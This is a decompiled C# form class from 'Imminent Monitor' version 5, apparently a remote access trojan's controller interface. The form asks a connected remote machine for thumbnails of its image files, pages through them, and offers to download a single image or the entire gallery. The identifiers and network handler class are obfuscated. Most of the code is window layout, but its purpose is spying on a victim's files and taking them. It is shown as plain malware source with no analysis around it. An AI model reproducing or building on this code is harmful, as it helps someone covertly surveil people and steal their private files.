// Decompiled with JetBrains decompiler
// Type: FormFileThumbnail
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormFileThumbnail : Form
{
  private IContainer icontainer_0;
  private Label label_0;
  private PictureBox pictureBox_0;
  private GControl8 gcontrol8_0;
  private GControl8 gcontrol8_1;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private GClass18 gclass18_0;
  private List<string> list_0;
  private int int_0;
  private List<Image> list_1;

  public FormFileThumbnail(GClass18 gclass18_1, List<string> list_2)
  {
    this.list_0 = new List<string>();
    this.int_0 = 0;
    this.list_1 = new List<Image>();
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.list_0 = list_2;
    this.gclass18_0.method_20().formFileThumbnail_0 = this;
    this.vmethod_0().Text = string.Format("1 / {0}", (object) list_2.Count);
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Thumbnail,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery.NextImage,
      (object) this.list_0[this.int_0]
    });
    this.Text = string.Format("{0}/{1} - Thumbnails", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormFileThumbnail));
    this.vmethod_1(new Label());
    this.vmethod_3(new PictureBox());
    this.vmethod_9(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_11(new ToolStripMenuItem());
    this.vmethod_13(new ToolStripMenuItem());
    this.vmethod_7(new GControl8());
    this.vmethod_5(new GControl8());
    ((ISupportInitialize) this.vmethod_2()).BeginInit();
    this.vmethod_8().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_0().Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
    this.vmethod_0().AutoSize = true;
    Label label1 = this.vmethod_0();
    Point point1 = new Point(9, 242);
    Point point2 = point1;
    label1.Location = point2;
    this.vmethod_0().Name = "LabelPictures";
    Label label2 = this.vmethod_0();
    Size size1 = new Size(34, 13);
    Size size2 = size1;
    label2.Size = size2;
    this.vmethod_0().TabIndex = 7;
    this.vmethod_0().Text = "1 / 1";
    this.vmethod_2().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_2().BorderStyle = BorderStyle.FixedSingle;
    this.vmethod_2().ContextMenuStrip = this.vmethod_8();
    PictureBox pictureBox1 = this.vmethod_2();
    point1 = new Point(12, 12);
    Point point3 = point1;
    pictureBox1.Location = point3;
    this.vmethod_2().Name = "PictureBoxThumbnails";
    PictureBox pictureBox2 = this.vmethod_2();
    size1 = new Size(319, 216);
    Size size3 = size1;
    pictureBox2.Size = size3;
    this.vmethod_2().SizeMode = PictureBoxSizeMode.StretchImage;
    this.vmethod_2().TabIndex = 4;
    this.vmethod_2().TabStop = false;
    this.vmethod_8().Items.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_12()
    });
    this.vmethod_8().Name = "ContextMenuStrip1";
    ContextMenuStrip contextMenuStrip = this.vmethod_8();
    size1 = new Size(210, 48);
    Size size4 = size1;
    contextMenuStrip.Size = size4;
    this.vmethod_10().Name = "DownloadToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_10();
    size1 = new Size(209, 22);
    Size size5 = size1;
    toolStripMenuItem1.Size = size5;
    this.vmethod_10().Text = "Download Full Resolution";
    this.vmethod_12().Name = "DownloadEntireGalleryToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_12();
    size1 = new Size(209, 22);
    Size size6 = size1;
    toolStripMenuItem2.Size = size6;
    this.vmethod_12().Text = "Download Entire Gallery";
    this.vmethod_6().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    this.vmethod_6().method_1(componentResourceManager.GetString("ButtonPrevious.ImageString"));
    GControl8 gcontrol8_1 = this.vmethod_6();
    point1 = new Point(284, 234);
    Point point4 = point1;
    gcontrol8_1.Location = point4;
    this.vmethod_6().Name = "ButtonPrevious";
    GControl8 gcontrol8_2 = this.vmethod_6();
    size1 = new Size(24, 21);
    Size size7 = size1;
    gcontrol8_2.Size = size7;
    this.vmethod_6().TabIndex = 44;
    this.vmethod_6().Text = "RefreshButton2";
    this.vmethod_4().Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
    this.vmethod_4().method_1(componentResourceManager.GetString("ButtonNext.ImageString"));
    GControl8 gcontrol8_3 = this.vmethod_4();
    point1 = new Point(307, 234);
    Point point5 = point1;
    gcontrol8_3.Location = point5;
    this.vmethod_4().Name = "ButtonNext";
    GControl8 gcontrol8_4 = this.vmethod_4();
    size1 = new Size(24, 21);
    Size size8 = size1;
    gcontrol8_4.Size = size8;
    this.vmethod_4().TabIndex = 43;
    this.vmethod_4().Text = "RefreshButton2";
    this.AutoScaleDimensions = new SizeF(7f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    size1 = new Size(343, 267);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_6());
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_0());
    this.Controls.Add((Control) this.vmethod_2());
    this.Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.KeyPreview = true;
    this.Name = nameof (FormFileThumbnail);
    this.ShowIcon = false;
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "Thumbnails - ";
    ((ISupportInitialize) this.vmethod_2()).EndInit();
    this.vmethod_8().ResumeLayout(false);
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual Label vmethod_0() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(Label label_1) => this.label_0 = label_1;

  internal virtual PictureBox vmethod_2() => this.pictureBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(PictureBox pictureBox_1) => this.pictureBox_0 = pictureBox_1;

  internal virtual GControl8 vmethod_4() => this.gcontrol8_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(GControl8 gcontrol8_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_0);
    if (this.gcontrol8_0 != null)
      this.gcontrol8_0.Click -= eventHandler;
    this.gcontrol8_0 = gcontrol8_2;
    if (this.gcontrol8_0 == null)
      return;
    this.gcontrol8_0.Click += eventHandler;
  }

  internal virtual GControl8 vmethod_6() => this.gcontrol8_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(GControl8 gcontrol8_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.gcontrol8_1 != null)
      this.gcontrol8_1.Click -= eventHandler;
    this.gcontrol8_1 = gcontrol8_2;
    if (this.gcontrol8_1 == null)
      return;
    this.gcontrol8_1.Click += eventHandler;
  }

  internal virtual ContextMenuStrip vmethod_8() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_10() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_4);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_12() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_2;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  private void method_0(object sender, EventArgs e)
  {
    if (this.int_0 >= this.list_0.Count - 1)
      return;
    ++this.int_0;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Thumbnail,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery.NextImage,
      (object) this.list_0[this.int_0]
    });
  }

  private void method_1(object sender, EventArgs e)
  {
    if (this.int_0 <= 0)
      return;
    --this.int_0;
    this.vmethod_2().Image = this.list_1[this.int_0];
    this.method_3();
  }

  public void method_2(byte[] byte_0)
  {
    using (MemoryStream memoryStream = new MemoryStream(byte_0))
    {
      Image image = Image.FromStream((Stream) memoryStream);
      Graphics.FromImage(image).DrawString(Path.GetFileName(this.list_0[this.int_0]), new Font("Verdana", 8.25f), Brushes.Red, (PointF) new Point(0, image.Height - 15));
      this.vmethod_2().Image = image;
      this.list_1.Add(image);
      this.method_3();
    }
  }

  private void method_3() => this.vmethod_0().Text = string.Format("{0} / {1}", (object) (this.int_0 + 1), (object) this.list_0.Count);

  private void method_4(object sender, EventArgs e)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new List<object>()
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileTransfer,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.StartDownload,
      (object) this.list_0[this.int_0]
    }.ToArray());
    this.gclass18_0.method_20().formFileManager_0.vmethod_68().Start();
    int num = (int) MessageBox.Show("Downloading Image, Please check the \"Downloads\" tab", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
  }

  private void method_5(object sender, EventArgs e)
  {
    List<object> objectList = new List<object>();
    objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileTransfer);
    objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.StartDownload);
    int num1 = this.list_0.Count - 1;
    for (int index = 0; index <= num1; ++index)
      objectList.Add((object) this.list_0[index]);
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, objectList.ToArray());
    this.gclass18_0.method_20().formFileManager_0.vmethod_68().Start();
    int num2 = (int) MessageBox.Show("Downloading Gallery, Please check the \"Downloads\" tab", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
  }

  protected override bool ProcessCmdKey(ref Message m, Keys keyData)
  {
    switch (keyData)
    {
      case Keys.Left:
        if (this.int_0 > 0)
        {
          --this.int_0;
          this.vmethod_2().Image = this.list_1[this.int_0];
          this.method_3();
          break;
        }
        break;
      case Keys.Right:
        if (this.int_0 < this.list_0.Count - 1)
        {
          ++this.int_0;
          dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
          {
            (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.FileHeader,
            (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Thumbnail,
            (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileThumbnailGallery.NextImage,
            (object) this.list_0[this.int_0]
          });
          break;
        }
        break;
    }
    return base.ProcessCmdKey(ref m, keyData);
  }
}
